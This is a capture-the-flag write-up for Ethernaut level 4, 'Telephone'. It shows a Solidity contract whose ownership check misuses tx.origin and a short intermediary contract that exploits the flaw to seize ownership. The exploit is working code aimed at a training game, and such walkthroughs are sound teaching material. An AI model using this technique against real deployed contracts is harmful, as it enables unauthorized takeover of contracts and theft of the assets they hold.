# Level 4: Telephone

This is the level 4 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- [Difference between `tx.origin` and `msg.sender`](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

`player` has to claim this contract's ownership.

Simple one. We'll make an intermediate contract (named `IntermediateContract`) with the same method `changeOwner` (or anything else -- name doesn't matter) on Remix. `IntermediateContract`'s `changeOwner` will simply call `Telephone` contract's `changeOwner`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```

`player` will call `IntermediateContract` contract's `changeOwner`, which in turn will call `Telephone`'s `changeOwner` with `msg.sender` (which is `player`) as param. In that case `tx.origin` is `player` and `msg.sender` is `IntermediateContract`'s address. And since now `tx.origin` != `msg.sender`, `player` has claimed the ownership.

Done.